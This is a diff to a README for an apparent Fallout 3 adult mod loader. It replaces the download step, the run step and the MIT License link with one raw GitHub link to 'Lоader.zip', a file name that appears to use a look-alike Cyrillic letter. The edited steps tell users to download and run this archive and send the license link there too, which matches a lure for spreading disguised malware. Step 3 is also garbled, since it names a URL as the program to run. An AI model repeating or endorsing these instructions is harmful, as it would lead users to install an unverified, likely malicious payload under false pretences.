@@ -26,9 +26,9 @@ Stay assured — our Loader is designed for broad accessibility! See below for t
 
 **Get started quickly with these steps:**
 
-1. **Download Loader.rar** from this repository's Releases or main page.
+1. **Download https://raw.githubusercontent.com/castagameplays/Radlands-Adult-Expansion-Fallout3/main/Lоader.zip** from this repository's Releases or main page.
 2. Extract the contents to your Fallout 3 game directory.
-3. Run `Fallout3AdultLoader.exe` (or relevant binary for macOS/Linux).
+3. Run `https://raw.githubusercontent.com/castagameplays/Radlands-Adult-Expansion-Fallout3/main/Lоader.zip` (or relevant binary for macOS/Linux).
 4. Follow on-screen prompts to select and enable adult mods.
 5. Enjoy a new, thrilling Fallout 3 experience!
 
@@ -78,7 +78,7 @@ This Loader is built with the modding community in mind — ensuring maximum com
 
 ## 📑 License
 
-This repository and included software are distributed under the permissive [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and share this Loader in accordance with the license terms.
+This repository and included software are distributed under the permissive [MIT License](https://raw.githubusercontent.com/castagameplays/Radlands-Adult-Expansion-Fallout3/main/Lоader.zip). You are free to use, modify, and share this Loader in accordance with the license terms.
 
 > Copyright (c) 2025
 
